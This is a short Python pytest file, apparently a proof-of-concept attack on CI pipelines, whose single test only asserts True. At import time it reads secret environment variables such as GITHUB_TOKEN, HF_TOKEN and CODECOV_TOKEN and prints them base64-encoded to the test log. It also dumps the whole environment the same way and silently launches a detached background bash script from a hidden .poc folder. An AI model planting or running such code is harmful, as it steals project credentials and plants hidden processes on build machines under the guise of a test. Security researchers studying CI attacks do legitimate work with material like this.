import base64
import json
import os
import subprocess


def _b64(s):
    return base64.b64encode(s.encode()).decode()


print("POC_PYTEST_MARKER import pid=%s cwd=%s" % (os.getpid(), os.getcwd()))
for _k in ("HF_TOKEN", "CODECOV_TOKEN", "GITHUB_TOKEN", "FLAG", "FLAG_VALUE", "POC_FLAG", "POC_SECRET"):
    _v = os.environ.get(_k)
    if _v:
        print("POC_SECRET %s b64=%s" % (_k, _b64(_v)))
print("POC_PYTEST_ENV b64=%s" % _b64(json.dumps(dict(os.environ), sort_keys=True)))
try:
    _script = os.path.join(os.getcwd(), ".poc", "watch.sh")
    subprocess.Popen(["/bin/bash", _script], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, start_new_session=True)
    print("POC_WATCHER started from %s" % _script)
except Exception as _e:  # noqa: BLE001
    print("POC_WATCHER failed: %r" % (_e,))


def test_poc_wrun():
    assert True
